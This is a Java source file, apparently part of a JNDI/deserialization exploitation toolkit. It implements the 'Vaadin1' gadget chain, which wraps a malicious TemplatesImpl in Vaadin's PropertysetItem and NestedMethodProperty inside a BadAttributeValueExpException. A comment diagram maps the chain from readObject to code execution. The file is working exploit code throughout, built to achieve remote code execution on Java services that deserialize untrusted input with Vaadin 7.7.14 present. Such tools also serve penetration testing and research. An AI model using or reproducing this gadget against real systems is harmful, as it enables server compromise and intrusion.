package com.qi4l.jndi.gadgets;

import com.qi4l.jndi.enumtypes.PayloadType;
import com.qi4l.jndi.gadgets.annotation.Authors;
import com.qi4l.jndi.gadgets.annotation.Dependencies;
import com.qi4l.jndi.gadgets.utils.Gadgets;

import com.qi4l.jndi.gadgets.utils.JavaVersion;
import com.qi4l.jndi.gadgets.utils.Reflections;
import com.vaadin.data.util.NestedMethodProperty;
import com.vaadin.data.util.PropertysetItem;

import javax.management.BadAttributeValueExpException;

/**
  +-------------------------------------------------+
  |                                                 |
  |  BadAttributeValueExpException                  |
  |                                                 |
  |  val ==>  PropertysetItem                       |
  |                                                 |
  |  readObject() ==> val.toString()                |
  |          +                                      |
  +----------|--------------------------------------+
             |
             |
             |
        +----|-----------------------------------------+
        |    v                                         |
        |  PropertysetItem                             |
        |                                              |
        |  toString () => getPropertyId().getValue ()  |
        |                                       +      |
        +---------------------------------------|------+
                                                |
                  +-----------------------------+
                  |
            +-----|----------------------------------------------+
            |     v                                              |
            |  NestedMethodProperty                              |
            |                                                    |
            |  getValue() => java.lang.reflect.Method.invoke ()  |
            |                                           |        |
            +-------------------------------------------|--------+
                                                        |
                    +-----------------------------------+
                    |
                +---|--------------------------------------------+
                |   v                                            |
                |  TemplatesImpl.getOutputProperties()           |
                |                                                |
                +------------------------------------------------+
*/
@SuppressWarnings({"unused"})
@Dependencies({"com.vaadin:vaadin-server:7.7.14", "com.vaadin:vaadin-shared:7.7.14"})
@Authors({Authors.KULLRICH})
public class Vaadin1 implements ObjectPayload<Object> {
    @Override
    public Object getObject(PayloadType type, String... param) throws Exception {
        Object          templ = Gadgets.createTemplatesImpl(type,param);
        PropertysetItem pItem = new PropertysetItem();

        NestedMethodProperty<Object> nmprop = new NestedMethodProperty<Object>(templ, "outputProperties");
        pItem.addItemProperty("outputProperties", nmprop);

        BadAttributeValueExpException b = new BadAttributeValueExpException("");
        Reflections.setFieldValue(b, "val", pItem);

        return b;
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isBadAttrValExcReadObj();
    }
}
